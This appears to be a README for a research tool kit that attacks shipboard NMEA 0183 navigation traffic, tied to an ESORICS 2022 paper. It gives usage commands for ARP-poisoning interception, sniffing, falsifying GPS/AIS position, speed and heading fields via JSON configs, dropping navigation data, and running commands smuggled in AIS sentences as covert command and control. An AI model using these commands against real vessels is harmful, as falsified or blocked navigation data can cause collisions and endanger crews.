# NMEA_Tool_Kit

Tool kit for encoding, decoding **NMEA 0183 sentences of AIS, GPS** and to perform MITM attacks ship board navigational systems.

This scripts are tested in Ubuntu Machiene running ***Python 3.9.7*** with simulated NMEA 0183 data.

## Setup

To use the scriprs, install the modules in the ***requirements.txt***

```
pip3 install requirements.txt
```

## Attack Modes

Script contains 4 attack options, run ***-h*** for help.

```
python3 nmea_attacks.py -h
```

Before running the ***nmea_attacks.py***, need to run ***mitm_arp.py*** to start ARP poisoining to intercept traffic, Requires root privileges

```
sudo python3 mitm_arp.py -t TARGET_IP -s SOURCE_IP -i INTERFACE_NAME
```

#### S - Sniffing Attack

Sniff all NMEA 0183 data in communication between targets.

```
sudo python3 nmea_attacks.py -t TARGET_IP -s SOURCE_IP -o S
```

#### M - Modification Attack

Modify NMEA sentence data fields based on json configuration file.

```
sudo python3 nmea_attacks.py -t TARGET_IP -s SOURCE_IP -o M -c CONFIG_FILE.json
```

For sample configuration refer ***mitm_config.json***

```
"GPGGA" : {
    "attributes" : [
        {
            "key" : "hdop",
            "value" : "2",
            "incremental": false
        },
        {
            "key" : "lon",
            "value": 100,
            "incremental" : true
        }
    ]
}
```
if incremental is ```true```, then specify value as ```integer or float``` (without quotes).

#### A - Attribute Modification

To target specific data fileds across all intercepted sentences if exists (eg. lat/lon).

```
sudo python3 nmea_attacks.py -t TARGET_IP -s SOURCE_IP -o A -c CONFIG_FILE.json
```

Refer ***attr_config.json*** for example

```
{
"attributes" : 
    [
        {
            "key" : "lat",
            "value" : 100,
            "incremental": true
        },
        {
            "key" : "spd_over_grnd",
            "value" : "10",
            "incremental": false
        },
        {
            "key": "heading",
            "value" : "20",
            "incremental" : false
        }

    ]
}
```

#### D - DoS attacks

Actively drop all NMEA 0183 data in transit

```
sudo python3 nmea_attacks.py -t TARGET_IP -s SOURCE_IP -o D
```

## AIS Command & Control

Use AIS as covert communication channel between attacker machine and attacker controlled node onboard the vessel. For detailed explation please refer


> Ahmed Amro, Vasileios Gkioulos, "From Click To Sink: Utilizing AIS for command and control in maritime cyber attacks", 27th European Symposium on Research > in Computer Security (ESORICS) 2022.

#### NOTE: 

#### Generate Payloads

To create AIS sentences with attacker payload use ***ais_cc.py**

For file payloads

```
python3 ais_cc.py -f FILE_NAME
```

For commands

```
python3 ais_cc.py -c "CMD"
```

#### Command & Control Execution

Attack option ***-o C*** in ***nmea_attacks.py*** demonstrates attack node executing payloads in AIS senetences.

```
sudo python3 nmea_attacks.py -t TARGET_IP -s SOURCE_IP -o C
```
